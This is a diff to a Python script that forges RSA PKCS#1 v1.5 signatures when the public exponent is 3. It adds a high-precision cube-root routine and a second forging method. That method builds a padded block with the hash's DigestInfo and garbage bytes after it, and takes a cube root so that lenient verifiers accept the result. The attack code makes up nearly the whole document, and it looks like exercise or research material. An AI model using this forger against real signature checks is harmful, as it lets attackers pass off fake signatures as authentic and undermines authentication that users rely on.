@@ -5,6 +5,8 @@ import hashlib
 import gmpy2
 import os
 
+from decimal import Decimal, getcontext
+
 HASH_ASN1 = {
 'MD5': b'\x30\x20\x30\x0c\x06\x08\x2a\x86\x48\x86\xf7\x0d\x02\x05\x05\x00\x04\x10',
 'SHA-1': b'\x30\x21\x30\x09\x06\x05\x2b\x0e\x03\x02\x1a\x05\x00\x04\x14',
@@ -61,7 +63,7 @@ class SignatureForger:
 	def encodePkcs1Suffix(self, message):
 		messageHash = self.hashAlg.digester(message).digest()
 		if ord(messageHash[-1]) & 0x01 != 0x01:
-			print("hash value must be uneven. Try a different message")
+			print("Hash value must be uneven. Try a different message")
 			exit()
 		suffix = "\x00" + self.hashAlg.digestInfo + messageHash
 		return suffix
@@ -90,14 +92,32 @@ class SignatureForger:
 		signature = self.addPrefixToSignature(signatureSuffix)
 		return signature
 
-	def forgeSignature_method2(self, message):
-		suffix = encodePkcs1Suffix(message)
-		
+ 
+	def nthroot (self, n, A, precision=300):
+	    getcontext().prec = precision
+	 
+	    n = Decimal(n)
+	    x_0 = A / n #step 1: make a while guess.
+	    x_1 = 1     #need it to exist before step 2
+	    while True:
+		#step 2:
+		x_0, x_1 = x_1, (1 / n)*((n - 1)*x_0 + (A / (x_0 ** (n - 1))))
+		if x_0 == x_1:
+		    return x_1
+
+	def forgeSignature_method2(self, message, psLength=8):
+		prefix = "\x00\x01"
+		prefix += "\xFF"*psLength
+		suffix = self.encodePkcs1Suffix(message)
+		plain = prefix + suffix + "\x00"*((self.keysize/8)-(len(prefix) + len(suffix)))
+		signature = self.toBytes(int(self.nthroot(3, self.toInt(plain)))+1)
+		return signature
 
 if __name__ == "__main__":
 	message = "WhAAASDAatWhatInTheButt"
-	signatureForger = SignatureForger(1024, Hash("SHA-1"), 1)
-	signature = signatureForger.forgeSignature_method1(message)
+	signatureForger = SignatureForger(2048, Hash("SHA-1"), 1)
+	#signature = signatureForger.forgeSignature_method1(message)
+	signature = signatureForger.forgeSignature_method2(message)
 	print(hex(signatureForger.toInt(signature) ** 3))
 	'''
 	output format: raw, hex, base64
